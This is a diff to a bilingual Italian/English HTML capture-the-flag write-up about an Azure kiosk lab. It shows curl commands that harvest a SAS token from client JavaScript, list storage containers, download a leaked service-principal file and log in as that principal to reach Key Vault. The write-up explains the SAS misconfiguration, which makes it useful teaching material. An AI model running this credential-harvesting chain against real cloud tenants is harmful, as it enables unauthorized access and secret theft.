@@ -191,18 +191,18 @@
 
     <div class="callout">
       <div class="callout-label" data-it="// prima di iniziare" data-en="// before you start">// prima di iniziare</div>
-      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina. Tutti i comandi girano sulla &lt;strong&gt;tua&lt;/strong&gt; macchina. Servono: &lt;code&gt;curl&lt;/code&gt; e &lt;code&gt;jq&lt;/code&gt;." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP. Every command runs on &lt;strong&gt;your&lt;/strong&gt; machine. You need: &lt;code&gt;curl&lt;/code&gt; and &lt;code&gt;jq&lt;/code&gt;.">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina. Tutti i comandi girano sulla <strong>tua</strong> macchina. Servono: <code>curl</code> e <code>jq</code>.</p>
+      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina (il sito risponde su &lt;code&gt;https://&amp;lt;target&amp;gt;&lt;/code&gt;; se il certificato non valida aggiungi &lt;code&gt;-k&lt;/code&gt; a curl). Tutti i comandi girano sulla &lt;strong&gt;tua&lt;/strong&gt; macchina. Servono: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;jq&lt;/code&gt; e la Azure CLI (&lt;code&gt;az&lt;/code&gt;) — installazione al passo [03], serve sudo." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP (the site answers on &lt;code&gt;https://&amp;lt;target&amp;gt;&lt;/code&gt;; if the cert doesn't validate add &lt;code&gt;-k&lt;/code&gt; to curl). Every command runs on &lt;strong&gt;your&lt;/strong&gt; machine. You need: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;jq&lt;/code&gt; and the Azure CLI (&lt;code&gt;az&lt;/code&gt;) — install shown in step [03], needs sudo.">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina (il sito risponde su <code>https://&lt;target&gt;</code>; se il certificato non valida aggiungi <code>-k</code> a curl). Tutti i comandi girano sulla <strong>tua</strong> macchina. Servono: <code>curl</code>, <code>jq</code> e la Azure CLI (<code>az</code>) — installazione al passo [03], serve sudo.</p>
     </div>
 
     <h2 data-it="[01] Recon: il chiosco parla troppo" data-en="[01] Recon: the kiosk talks too much" id='recon'>[01] Recon: il chiosco parla troppo</h2>
     <p data-it="La landing page non offre appigli, così passo al &lt;em&gt;view-source&lt;/em&gt; e tiro giù &lt;code&gt;app.js&lt;/code&gt;. Il chiosco scrive la &lt;em&gt;recovery phrase&lt;/em&gt; del visitatore direttamente nel blob storage, senza backend in mezzo: significa che la credenziale per farlo &lt;strong&gt;deve&lt;/strong&gt; vivere nella pagina. E infatti." data-en="The landing page offers no handholds, so I move to &lt;em&gt;view-source&lt;/em&gt; and pull &lt;code&gt;app.js&lt;/code&gt;. The kiosk writes the visitor's &lt;em&gt;recovery phrase&lt;/em&gt; straight into blob storage with no backend in between: which means the credential to do it &lt;strong&gt;has to&lt;/strong&gt; live in the page. And there it is.">La landing page non offre appigli, così passo al <em>view-source</em> e tiro giù <code>app.js</code>. Il chiosco scrive la <em>recovery phrase</em> del visitatore direttamente nel blob storage, senza backend in mezzo: significa che la credenziale per farlo <strong>deve</strong> vivere nella pagina. E infatti.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># la landing non dà nulla: vado dritto al JS del chiosco</span>
-<span class="neutral">curl -s https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
+<span class="neutral">curl -sk https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># the landing page gives nothing: straight to the kiosk's JS</span>
-<span class="neutral">curl -s https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
+<span class="neutral">curl -sk https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
 </div></div>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># credenziali cablate nel client: pubbliche per definizione</span>
@@ -252,11 +252,21 @@
     <p data-it="Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un &lt;em&gt;Service SAS&lt;/em&gt; sul singolo container/blob con permesso &lt;em&gt;create/write&lt;/em&gt;, meglio se legato a una &lt;em&gt;stored access policy&lt;/em&gt; revocabile. Qui invece &lt;code&gt;srt=sco&lt;/code&gt; include la &lt;strong&gt;s&lt;/strong&gt; di &lt;em&gt;service&lt;/em&gt;: è proprio quella singola lettera che abilita la &lt;code&gt;?comp=list&lt;/code&gt; alla radice dell'account. La distanza tra &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; e &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; è tutta la vulnerabilità. Ironia: il token è &lt;em&gt;read+list&lt;/em&gt;, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa." data-en="Here's the analysis that matters. To write a single blob you don't need an Account SAS at all: a &lt;em&gt;Service SAS&lt;/em&gt; on the single container/blob with &lt;em&gt;create/write&lt;/em&gt; is enough, ideally tied to a revocable &lt;em&gt;stored access policy&lt;/em&gt;. Instead &lt;code&gt;srt=sco&lt;/code&gt; includes the &lt;strong&gt;s&lt;/strong&gt; for &lt;em&gt;service&lt;/em&gt;: that one letter is exactly what enables &lt;code&gt;?comp=list&lt;/code&gt; at the account root. The gap between &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; and &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; is the entire vulnerability. Irony: the token is &lt;em&gt;read+list&lt;/em&gt;, so it can't even do the write the kiosk claims to need, but it happily hands me a map.">Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un <em>Service SAS</em> sul singolo container/blob con permesso <em>create/write</em>, meglio se legato a una <em>stored access policy</em> revocabile. Qui invece <code>srt=sco</code> include la <strong>s</strong> di <em>service</em>: è proprio quella singola lettera che abilita la <code>?comp=list</code> alla radice dell'account. La distanza tra <code>o</code>+<code>cw</code> e <code>sco</code>+<code>rl</code> è tutta la vulnerabilità. Ironia: il token è <em>read+list</em>, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># lo scope 's' (service) abilita la list a livello di account</span>
-curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS"</pre>
+<span class="comment"># NB: la risposta è XML (non JSON), niente jq: estraggo i &lt;Name&gt; a mano</span>
+curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS" \
+  | grep -o '&lt;Name&gt;[^&lt;]*' | cut -d'&gt;' -f2
+<span class="comment"># $web        &lt;- il sito statico</span>
+<span class="comment"># backups     &lt;- atteso</span>
+<span class="comment"># vault       &lt;- non linkato da nessuna parte: ci guardo dentro</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># the 's' (service) scope enables account-level listing</span>
-curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS"</pre>
+<span class="comment"># note: the response is XML (not JSON), no jq: pull the &lt;Name&gt; fields by hand</span>
+curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS" \
+  | grep -o '&lt;Name&gt;[^&lt;]*' | cut -d'&gt;' -f2
+<span class="comment"># $web        &lt;- the static site</span>
+<span class="comment"># backups     &lt;- expected</span>
+<span class="comment"># vault       &lt;- linked nowhere: I look inside</span></pre>
 </div></div>
     <div class="callout">
   <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
@@ -266,13 +276,21 @@ curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</s
     <h2 data-it="[03] Dal container nascosto al Key Vault" data-en="[03] From the hidden container to Key Vault" id='vault'>[03] Dal container nascosto al Key Vault</h2>
     <p data-it="Il container &lt;code&gt;vault&lt;/code&gt; contiene due blob: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, un depistaggio, e &lt;code&gt;backup-service-account.json&lt;/code&gt;, il vero premio." data-en="The &lt;code&gt;vault&lt;/code&gt; container holds two blobs: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, a decoy, and &lt;code&gt;backup-service-account.json&lt;/code&gt;, the real prize.">Il container <code>vault</code> contiene due blob: <code>seed_phrase.txt</code>, un depistaggio, e <code>backup-service-account.json</code>, il vero premio.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="comment"># elenco i blob del container 'vault' e scarico il JSON</span>
-<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS"</span>
+<pre><span class="comment"># elenco i blob del container 'vault' (di nuovo XML, non JSON)</span>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS" \</span>
+<span class="neutral">  | grep -o '&lt;Name&gt;[^&lt;]*' | cut -d'&gt;' -f2</span>
+<span class="comment"># seed_phrase.txt                 &lt;- depistaggio</span>
+<span class="comment"># backup-service-account.json     &lt;- il vero premio</span>
+<span class="comment"># scarico il JSON:</span>
 <span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault/backup-service-account.json?$SAS" -o backup-service-account.json</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="comment"># list the 'vault' container's blobs and pull the JSON</span>
-<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS"</span>
+<pre><span class="comment"># list the 'vault' container's blobs (XML again, not JSON)</span>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS" \</span>
+<span class="neutral">  | grep -o '&lt;Name&gt;[^&lt;]*' | cut -d'&gt;' -f2</span>
+<span class="comment"># seed_phrase.txt                 &lt;- decoy</span>
+<span class="comment"># backup-service-account.json     &lt;- the real prize</span>
+<span class="comment"># pull the JSON:</span>
 <span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault/backup-service-account.json?$SAS" -o backup-service-account.json</span></pre>
 </div></div>
     <div class="lang-it"><div class="code-block">
@@ -329,14 +347,20 @@ curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</s
 <span class="neutral">az login --service-principal \</span>
 <span class="neutral">  -u "$CLIENT_ID" \</span>
 <span class="neutral">  -p "$CLIENT_SECRET" \</span>
-<span class="neutral">  --tenant "$TENANT"</span></pre>
+<span class="neutral">  --tenant "$TENANT"</span>
+<span class="comment"># se risponde "No subscriptions found for ...": è un SP di sola automazione backup,</span>
+<span class="comment"># rilancia lo stesso comando con --allow-no-subscriptions — i comandi</span>
+<span class="comment"># 'az keyvault' sono data-plane e girano comunque</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># authenticate as the leaked service principal</span>
 <span class="neutral">az login --service-principal \</span>
 <span class="neutral">  -u "$CLIENT_ID" \</span>
 <span class="neutral">  -p "$CLIENT_SECRET" \</span>
-<span class="neutral">  --tenant "$TENANT"</span></pre>
+<span class="neutral">  --tenant "$TENANT"</span>
+<span class="comment"># if it says "No subscriptions found for ...": it's a backup-only automation SP,</span>
+<span class="comment"># re-run the same command with --allow-no-subscriptions — the</span>
+<span class="comment"># 'az keyvault' commands are data-plane and work anyway</span></pre>
 </div></div>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># quali secret vivono nel vault?</span>
